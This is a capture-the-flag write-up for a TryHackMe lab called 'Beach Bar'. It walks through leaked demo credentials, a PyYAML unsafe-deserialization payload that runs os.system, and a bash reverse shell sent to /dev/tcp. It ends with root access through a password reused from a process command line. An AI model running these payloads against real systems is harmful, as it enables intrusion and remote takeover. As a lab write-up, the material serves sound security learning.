---
title: "Beach Bar"
section: tryhackme
date: "2026-08-09"
order: 7
summary: "Leaked credentials lead to unsafe YAML deserialization, remote code execution, and Linux privilege escalation."
tags: ["tryhackme", "byte-lotus", "unsafe-deserialization", "yaml", "linux", "privilege-escalation"]
image: "/assets/images/tryhackme/beach-bar/beach-bar-cover-v2.png"
image_fit: contain
---
**Tags:** `flask` `pyyaml-deserialization` `rce` `credential-reuse` `linux`

The beach bar's jukebox takes song requests from anyone with a phone. The briefing hints at three things a DJ who never logs out, a queue that accepts more than song titles, and a service quietly announcing "something" and each one turns out to be a real finding on the box.

---

## Recon

Full port + service scan on the target.

```bash
nmap -sC -sV -p- -T4 10.112.150.245
```

![nmap scan](/assets/images/tryhackme/beach-bar/nmap-scan.png)

Only two ports open: SSH on 22 and a Gunicorn web app on 80 that redirects to `/login` — Gunicorn means a Python/Flask backend.

---

## Web Enumeration

Pulled the raw source of the login page and looked for anything left behind in the HTML.

```bash
curl -s http://10.112.150.245/login
```

![leaked credentials](/assets/images/tryhackme/beach-bar/leaked-creds.png)

Demo credentials `dj / dj` were sitting in an HTML comment above the form — that's the DJ who never logs out.

---

## Logging In

Logged in with the leaked creds and landed on the dashboard.

![dashboard](/assets/images/tryhackme/beach-bar/dashboard.png)

The dashboard exposes an **Import / Export** feature that loads playlists as raw YAML into the Flask backend — the queue that accepts more than song titles.

---

## Confirming RCE

Since YAML is being parsed server-side, tested for unsafe deserialization with a harmless `os.system` payload in the Import textarea.

```yaml
playlist: !!python/object/apply:os.system
  args: ['sleep 5']
```

![rce confirmed](/assets/images/tryhackme/beach-bar/rce-confirm.png)

The app returned `{'playlist': 0}` — the `0` is the return code of `os.system()`, confirming arbitrary command execution.

Once I had a shell I read the source to pin down the bug.

```bash
cat /opt/beach-bar/webapp/app.py
```

![vulnerable yaml.load](/assets/images/tryhackme/beach-bar/yaml-load.png)

The `/import` route calls `yaml.load(content, Loader=yaml.Loader)` instead of `yaml.safe_load()` — `yaml.Loader` deserializes arbitrary Python objects, which is exactly why the payload ran.

---

## Getting a Shell

Started a listener, then sent a reverse-shell payload through the same Import field (swap in your VPN IP).

```bash
nc -lvnp 4444
```

```yaml
playlist: !!python/object/apply:os.system
  args: ['bash -c "bash -i >& /dev/tcp/192.168.152.228/4444 0>&1"']
```

![reverse shell](/assets/images/tryhackme/beach-bar/shell.png)

Shell landed as `bartender` (the gunicorn worker runs as that user), giving us a foothold on the box.

---

## User Flag

Stabilized the shell and read the flag from the user's home directory.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /home/bartender/user.txt
```

![user flag](/assets/images/tryhackme/beach-bar/user-flag.png)

User flag captured as `bartender`.

---

## Privilege Escalation

`sudo -l`, SUID, cron and capabilities were all clean, so I looked at running processes.

```bash
ps auxww | grep -v "\[" | grep root
```

![leaked stream password](/assets/images/tryhackme/beach-bar/ps-streampass.png)

A root-owned daemon `jukeboxd.py` is running with `--stream-pass SunsetSpritz2024!` right in its command line.

---

## Root

Tried the leaked stream password directly against the root account.

```bash
su root
# password: SunsetSpritz2024!
```

![root flag](/assets/images/tryhackme/beach-bar/root-flag.png)

The stream password was reused as root's login password `su root` dropped straight into a root shell, and the flag was in `/root/root.txt`.

---
